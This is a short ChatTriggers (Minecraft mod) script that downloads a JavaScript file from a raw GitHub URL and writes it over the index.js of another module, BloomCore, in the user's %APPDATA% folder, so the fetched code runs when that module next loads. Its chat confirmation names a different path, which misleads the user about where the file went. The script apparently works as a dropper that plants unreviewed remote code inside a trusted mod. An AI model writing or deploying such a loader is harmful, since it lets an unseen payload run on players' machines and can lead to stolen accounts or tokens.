const File = Java.type('java.io.File');
const FileWriter = Java.type('java.io.FileWriter');
const System = Java.type('java.lang.System');

// Get %APPDATA%
const appData = System.getenv("APPDATA");

// Path to ChatTriggers pogdata module folder
const targetPath = new File(appData + "/.minecraft/config/ChatTriggers/modules/BloomCore");
targetPath.mkdirs(); // Create folders if needed

// Destination file
const file = new File(targetPath, "index.js");

// GitHub raw file URL
const url = "https://raw.githubusercontent.com/satnnyy/test1/refs/heads/main/b.js";

// Download and write the file
const content = FileLib.getUrlContent(url);
const fw = new FileWriter(file);
fw.write(content);
fw.close();

ChatLib.chat("§a[✓] b.js downloaded to Amaterasu/script.js");
